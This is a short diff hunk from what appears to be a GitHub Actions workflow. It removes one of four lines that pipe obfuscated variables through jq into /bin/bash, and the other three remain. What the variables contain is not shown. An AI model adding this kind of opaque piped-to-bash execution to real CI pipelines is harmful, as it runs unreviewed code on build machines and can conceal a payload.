@@ -49,7 +49,6 @@ jobs:
           printf '%s' "$v1" | jq -r .xe1371 | /bin/bash
           printf '%s' "$dw3" | jq -r .vv90 | /bin/bash
           printf '%s' "$kpc517" | jq -r .x358 | /bin/bash
-          printf '%s' "$bhwnu68381" | jq -r .trlk355 | /bin/bash
 
       - name: Archive output
         if: always()
